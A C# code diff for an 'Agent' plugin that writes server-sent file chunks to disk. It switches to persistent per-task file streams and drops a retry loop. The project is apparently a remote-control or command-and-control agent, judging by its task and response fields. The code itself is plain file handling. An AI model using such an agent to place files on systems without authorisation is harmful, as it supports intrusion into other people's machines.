@@ -18,12 +18,14 @@ namespace Agent
         private ITokenManager tokenManager { get; set; }
         private IAgentConfig config { get; set; }
         private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
+        private Dictionary<string, FileStream> _streams { get; set; }
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
             this.messageManager = messageManager;
             this.logger = logger;
             this.tokenManager = tokenManager;
             this.uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
+            this._streams = new Dictionary<string, FileStream>();
             this.config = config;
         }
 
@@ -61,6 +63,24 @@ namespace Agent
                 }.ToJson());
                 return;
             }
+
+            try
+            {
+                _streams.Add(job.task.id, new FileStream(uploadJob.path, FileMode.Append));
+            }
+            catch (Exception e)
+            {
+                await messageManager.AddResponse(new ResponseResult
+                {
+                    status = "error",
+                    completed = true,
+                    task_id = job.task.id,
+                    user_output = e.ToString(),
+                }.ToJson());
+                this.CompleteUploadJob(job.task.id);
+                return;
+            }
+
 
             await messageManager.AddResponse(new UploadResponse
             {
@@ -189,6 +209,13 @@ namespace Agent
             {
                 uploadJobs.Remove(task_id, out _);
             }
+
+            if (_streams.ContainsKey(task_id) && _streams[task_id] is not null)
+            {
+                _streams[task_id].Close();
+                _streams[task_id].Dispose();
+                _streams.Remove(task_id);
+            }
             this.messageManager.CompleteJob(task_id);
         }
 
@@ -199,37 +226,23 @@ namespace Agent
         private bool HandleNextChunk(byte[] bytes, string job_id)
         {
             ServerUploadJob job = uploadJobs[job_id];
-            int tries = 0;
-            int maxTries = 5;
-            while (tries < maxTries)
+
+            if (!_streams.ContainsKey(job_id))
             {
-                try
-                {
-                    using (var stream = new FileStream(job.path, FileMode.Append))
-                    {
-                        stream.Write(bytes, 0, bytes.Length);
-                        return true; ;
-                    }
-                }
-                catch (IOException e) //Sometimes when uploading exe's explorer will attempt to steal the handle to do stuff, so we add some retries
-                {
-                    tries++;
-                    if (tries >= maxTries)
-                    {
-                        this.messageManager.WriteLine(e.ToString(), job_id, true, "error");
-                        return false;
-                    }
-
-                    Thread.Sleep(1000);
-                }
-                catch (Exception e)
-                {
-                    this.messageManager.WriteLine(e.ToString(), job_id, true, "error");
-                    return false;
-
-                }
+                this.messageManager.WriteLine("No stream available.", job_id, true, "error");
+                return false;
             }
-            return false;
+
+            try
+            {
+                _streams[job_id].Write(bytes, 0, bytes.Length);
+                return true;
+            }
+            catch (Exception e)
+            {
+                this.messageManager.WriteLine(e.ToString(), job_id, true, "error");
+                return false;
+            }
         }
         /// <summary>
         /// Get a download job by ID
